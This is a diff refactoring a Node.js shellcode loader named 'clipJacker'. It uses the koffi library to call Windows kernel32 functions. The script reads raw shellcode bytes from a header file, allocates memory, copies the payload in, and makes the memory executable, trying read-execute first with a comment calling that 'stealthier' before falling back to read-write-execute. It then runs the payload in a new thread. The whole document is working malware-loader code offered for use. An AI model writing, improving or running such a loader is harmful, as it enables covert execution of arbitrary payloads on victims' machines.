@@ -3,6 +3,11 @@
 const fs = require('fs').promises;
 const koffi = require('koffi');
 
+/* ────────────────────────────
+   CONFIG / CONSTANTS
+──────────────────────────── */
+const DEFAULT_SHELLCODE_FILE = './bytes.h';
+
 const MEM_COMMIT  = 0x1000;
 const MEM_RESERVE = 0x2000;
 
@@ -12,28 +17,18 @@ const PAGE_EXECUTE_READWRITE = 0x40;
 
 const INFINITE = 0xFFFFFFFF;
 
+/* ────────────────────────────
+   SIMPLE LOGGER
+──────────────────────────── */
 function log(level, msg, extra = '') {
   const ts = new Date().toISOString();
-  log(`[${ts}] [${level}] ${msg}`, extra);
+  console.log(`[${ts}] [${level}] ${msg}`, extra);
 }
 
-async function clipJacker(filePath) {
-  // ── CONFIG ───────────────────────────────────────────────
-  const SHELLCODE_FILE = filePath || './bytes.h';
-
-  log('INFO', 'Reading shellcode from file', SHELLCODE_FILE);
-
-
-  // 1. Read the file content (should contain \xAA\xBB... style C header)
-  let rawContent;
-  try {
-    rawContent = await fs.readFile(SHELLCODE_FILE, 'utf8');
-  } catch (err) {
-    throw new Error(`Failed to read file ${SHELLCODE_FILE}: ${err.message}`);
-  }
-
-  // 2. Parse shellcode from C header string
- function parseShellcodeFromString(content) {
+/* ────────────────────────────
+   SHELLCODE PARSER (FAST)
+──────────────────────────── */
+function parseShellcode(content) {
   const bytes = [];
   let idx = 0;
 
@@ -53,67 +48,99 @@ async function clipJacker(filePath) {
   return Buffer.from(bytes);
 }
 
+/* ────────────────────────────
+   MAIN
+──────────────────────────── */
+async function clipJacker(filePath = DEFAULT_SHELLCODE_FILE) {
+  log('INFO', `Reading shellcode from ${filePath}`);
 
-  // 3. Allocate RW memory
-  const addr = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-  if (!addr) throw new Error('VirtualAlloc failed');
-
- log('INFO', 'Memory allocated', addr);
-
-
-  // 4. Copy shellcode
-  RtlCopyMemory(addr, shellcode, size);
-  log('INFO', 'Shellcode copied into memory');
-
-
-  // 5. Try RX first (stealthier), fallback to RWX
-  const oldProtect = Buffer.alloc(4);
-  let success = VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect);
-
-  if (!success) {
-    log('WARN', 'RX failed, falling back to RWX');
-    success = VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect);
-    if (!success) throw new Error('VirtualProtect failed');
-    log('INFO', 'Memory protection set to RWX');
-
-  } else {
-    log('INFO', 'Memory protection set to RX');
-
+  let raw;
+  try {
+    raw = await fs.readFile(filePath, 'utf8');
+  } catch (e) {
+    throw new Error(`File read failed: ${e.message}`);
   }
 
-  // 6. Execute in new thread
-  log('INFO', 'Launching shellcode thread');
+  const shellcode = parseShellcode(raw);
+  const size = shellcode.length;
 
-  const threadIdBuf = Buffer.alloc(4);
-  const thread = CreateThread(null, 0, addr, null, 0, threadIdBuf);
+  log('INFO', 'Shellcode parsed', `${size} bytes`);
 
-  if (!thread) throw new Error('CreateThread failed');
+  /* ── WinAPI bindings ── */
+  const kernel32 = koffi.load('kernel32.dll');
 
-  log('INFO', 'Thread created', `ID=${threadIdBuf.readUInt32LE(0)}`);
+  const VirtualAlloc = kernel32.func(
+    'void* __stdcall VirtualAlloc(void*, size_t, uint32_t, uint32_t)'
+  );
 
+  const VirtualProtect = kernel32.func(
+    'bool __stdcall VirtualProtect(void*, size_t, uint32_t, uint32_t*)'
+  );
 
-  // Wait for thread completion (blocks forever if shellcode doesn't exit)
-  await WaitForSingleObject(thread, INFINITE);
-  log('INFO', 'Shellcode execution finished');
+  const RtlCopyMemory = kernel32.func(
+    'void __stdcall RtlCopyMemory(void*, const void*, size_t)'
+  );
 
+  const CreateThread = kernel32.func(
+    'void* __stdcall CreateThread(void*, size_t, void*, void*, uint32_t, uint32_t*)'
+  );
+
+  const WaitForSingleObject = kernel32.func(
+    'uint32_t __stdcall WaitForSingleObject(void*, uint32_t)'
+  );
+
+  /* ── Allocate memory ── */
+  const addr = VirtualAlloc(
+    null,
+    size,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_READWRITE
+  );
+
+  if (!addr) {
+    throw new Error('VirtualAlloc failed');
+  }
+
+  log('INFO', 'Memory allocated', addr);
+
+  /* ── Copy payload ── */
+  RtlCopyMemory(addr, shellcode, size);
+  log('INFO', 'Shellcode copied');
+
+  /* ── Change protection ── */
+  const oldProtect = Buffer.alloc(4);
+
+  if (!VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect)) {
+    log('WARN', 'RX failed, falling back to RWX');
+
+    if (!VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect)) {
+      throw new Error('VirtualProtect failed (RX & RWX)');
+    }
+
+    log('INFO', 'Memory protection set to RWX');
+  } else {
+    log('INFO', 'Memory protection set to RX');
+  }
+
+  /* ── Execute ── */
+  const threadId = Buffer.alloc(4);
+  const thread = CreateThread(null, 0, addr, null, 0, threadId);
+
+  if (!thread) {
+    throw new Error('CreateThread failed');
+  }
+
+  log('INFO', 'Thread started', `ID=${threadId.readUInt32LE(0)}`);
+
+  WaitForSingleObject(thread, INFINITE);
+
+  log('INFO', 'Execution finished');
 }
 
-
-const args = process.argv.slice(2);
-if (args.length > 0) {
-  clipJacker(args[0]).catch(err => {
-    console.error('Error:', err.message);
-    process.exit(1);
-  });
-} else {
-  // Default fallback
-  clipJacker().catch(err => {
-    console.error('Error:', err.message);
-    process.exit(1);
-  });
-
-}
-
-
-
-
+/* ────────────────────────────
+   CLI
+──────────────────────────── */
+clipJacker(process.argv[2]).catch(err => {
+  log('ERROR', err.message);
+  process.exit(1);
+});
